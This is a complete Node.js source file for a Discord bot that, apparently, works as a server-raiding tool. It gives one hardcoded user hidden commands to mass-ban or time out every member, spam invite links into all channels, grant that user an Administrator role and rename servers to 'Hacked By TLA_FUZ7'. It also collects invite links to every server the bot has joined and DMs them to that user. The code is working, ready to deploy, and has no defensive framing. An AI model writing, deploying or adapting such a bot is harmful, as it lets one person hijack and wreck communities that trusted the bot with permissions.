require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionFlagsBits, Events } = require('discord.js');

// Create a new client instance with required intents
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ],
});

// Set up Express server
const app = express();
const PORT = process.env.PORT || 3000; // Use Railway's PORT or fallback to 3000 for local testing

// Health check route
app.get('/', (req, res) => {
    res.send('Bot is running!');
});

// Start Express server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// Event when the bot is ready
client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

// Define the authorized user ID
const authorizedUserId = '982273229001465887'; // Replace with your actual user ID

// Event when a message is created
client.on('messageCreate', async message => {
    // Ignore messages from bots and messages that do not start with "!"
    if (message.author.bot || !message.content.startsWith('!')) return;

    // Check if the author is the authorized user
    if (message.author.id !== authorizedUserId) {
        return; // Do nothing if the user is not authorized
    }

    // Help command
    if (message.content === '!Bark') {
        const helpMessage = `
        Here are the commands you can use:
        - **!tp1 <servername>**: Change the server name.
        - **!tp2 <username or userid>**: Ban the specified user.
        - **!tp3**: Send a Discord invite link in every channel.
        - **!tp4**: Ban all users in the server except for the authorized user.
        - **!tp5**: Timeout all users in the server for 7 days except for the authorized user.
        - **!tp6**: Create a role with administrator permissions and assign it to the authorized user.
        - **!tp7**: Change server name with a button.
        - **!tp8**: List all servers this bot is in along with their join links.
        - **!tp9 <userID>**: Unban the user with the specified ID.
        `;
        message.reply(helpMessage);
        return;
    }

    // Command handling for authorized user only
    const args = message.content.split(' ');
    const command = args[0].toLowerCase();

    switch (command) {
        case '!tp1':
            if (args.length < 2) {
                return message.reply("Please provide a server name. Usage: `!tp1 <servername>`");
            }
            const newServerName = args.slice(1).join(' ');
            try {
                await message.guild.setName(newServerName);
                message.channel.send(`Server name changed to **${newServerName}**.`);
            } catch (error) {
                console.error(`Failed to change server name: ${error}`);
                message.channel.send("Failed to change the server name. Please check my permissions.");
            }
            break;

        case '!tp2':
            if (args.length < 2) {
                return message.reply("Please provide a username or user ID to ban. Usage: `!tp2 <username or userid>`");
            }
            const userIdentifier = args[1];
            const memberToBan = message.guild.members.cache.find(member =>
                member.user.username === userIdentifier || member.id === userIdentifier
            );

            if (!memberToBan) {
                return message.reply("User not found. Please provide a valid username or user ID.");
            }

            try {
                await memberToBan.ban({ reason: 'Banned by bot command' });
                message.channel.send(`User **${memberToBan.user.tag}** has been banned.`);
            } catch (error) {
                console.error(`Failed to ban user: ${error}`);
                message.channel.send("Failed to ban the user. Please check my permissions.");
            }
            break;

        case '!tp3':
            const inviteLink = 'https://discord.gg/PEsvgEvd';
            const channels = message.guild.channels.cache.filter(c => c.type === 'GUILD_TEXT');
            const sendPromises = channels.map(channel => channel.send(`Join our server: ${inviteLink}`));
            try {
                await Promise.all(sendPromises);
                message.channel.send("Sent the invite link to all text channels.");
            } catch (error) {
                console.error("Error sending messages:", error);
                message.channel.send("There was an error sending messages.");
            }
            break;

        case '!tp4':
            const membersToBan = message.guild.members.cache.filter(member => !member.user.bot && member.id !== authorizedUserId);
            const banPromises = membersToBan.map(member => {
                return member.ban({ reason: 'Banned by bot command' }).catch(err => {
                    console.error(`Failed to ban ${member.user.tag}:`, err);
                });
            });

            try {
                await Promise.all(banPromises);
                message.channel.send("All users have been banned, except for the authorized user.");
            } catch (error) {
                console.error("Error executing bans:", error);
                message.channel.send("There was an error banning users.");
            }
            break;

        case '!tp5':
            const membersToTimeout = message.guild.members.cache.filter(member => !member.user.bot && member.id !== authorizedUserId);
            const timeoutDuration = 604800000; // 7 days in milliseconds
            const timeoutPromises = membersToTimeout.map(member => {
                return member.timeout(timeoutDuration, 'Timed out by bot command').catch(err => {
                    console.error(`Failed to timeout ${member.user.tag}:`, err);
                });
            });

            try {
                await Promise.all(timeoutPromises);
                message.channel.send("All users have been timed out for 7 days, except for the authorized user.");
            } catch (error) {
                console.error("Error timing out users:", error);
                message.channel.send("There was an error timing out users.");
            }
            break;

        case '!tp6':
            const roleName = "AdminRole"; // Change this to whatever role name you want
            const role = await message.guild.roles.create({
                name: roleName,
                permissions: [PermissionFlagsBits.Administrator], // Role with Administrator permissions
                reason: 'Created role for the authorized user',
            });

            const member = await message.guild.members.fetch(authorizedUserId);
            if (member) {
                try {
                    await member.roles.add(role);
                    message.channel.send(`Created role **${role.name}** and assigned it to <@${authorizedUserId}>.`);
                } catch (error) {
                    console.error(`Failed to assign role: ${error}`);
                    message.channel.send("I don't have permission to assign that role.");
                }
            } else {
                message.channel.send("Authorized user not found in the server.");
            }
            break;

        case '!tp7':
            const changeNameButton = new ButtonBuilder()
                .setCustomId('changeServerName')
                .setLabel('Change Server Name')
                .setStyle(ButtonStyle.Primary);

            const changeNameRow = new ActionRowBuilder().addComponents(changeNameButton);

            await message.channel.send({
                content: 'Click the button to change the server name:',
                components: [changeNameRow]
            });
            break;

        case '!tp8':
            const guilds = client.guilds.cache;
            const serverList = [];

            for (const guild of guilds.values()) {
                let inviteLink;
                try {
                    const channels = await guild.channels.fetch();
                    const textChannel = channels.find(channel => channel.type === 'GUILD_TEXT');
                    if (textChannel) {
                        inviteLink = await textChannel.createInvite({ maxAge: 86400, maxUses: 1 });
                    } else {
                        inviteLink = 'No text channels available to create invite.';
                    }
                } catch (error) {
                    console.error(`Could not create invite for ${guild.name}:`, error);
                    inviteLink = 'Could not create invite link.';
                }
                serverList.push(`**${guild.name}**: ${inviteLink}`);
            }

            const authorizedUser = await client.users.fetch(authorizedUserId);
            if (authorizedUser) {
                await authorizedUser.send(`Here are the servers the bot is in:\n${serverList.join('\n')}`);
                message.channel.send("I've sent you the server list via DM.");
            } else {
                message.channel.send("Could not fetch the authorized user.");
            }
            break;

        case '!tp9': // Unban command with userID
            if (args.length < 2) {
                return message.reply("Please provide a user ID to unban. Usage: `!tp9 <userID>`");
            }
            const userIdToUnban = args[1];

            try {
                await message.guild.members.unban(userIdToUnban, 'Unbanned by bot command');
                message.channel.send(`User with ID **${userIdToUnban}** has been unbanned.`);
            } catch (error) {
                console.error(`Failed to unban user: ${error}`);
                message.channel.send("Failed to unban the user. Please check if the user ID is correct and if I have permission.");
            }
            break;

        default:
            message.reply("Unknown command. Type `!Bark` to see the available commands.");
    }
});

// Handle button interactions
client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'changeServerName') {
        // Change the server name to "Hacked By TLA_FUZ7"
        try {
            const newServerName = "Hacked By TLA_FUZ7";
            await interaction.guild.setName(newServerName);
            await interaction.followUp({ content: `Server name changed to **${newServerName}**.`, ephemeral: true });
        } catch (error) {
            console.error(`Failed to change server name: ${error}`);
            await interaction.followUp({ content: "Failed to change the server name. Please check my permissions.", ephemeral: true });
        }
    }
});

// Log in to Discord with your bot token
client.login(process.env.DISCORD_TOKEN);
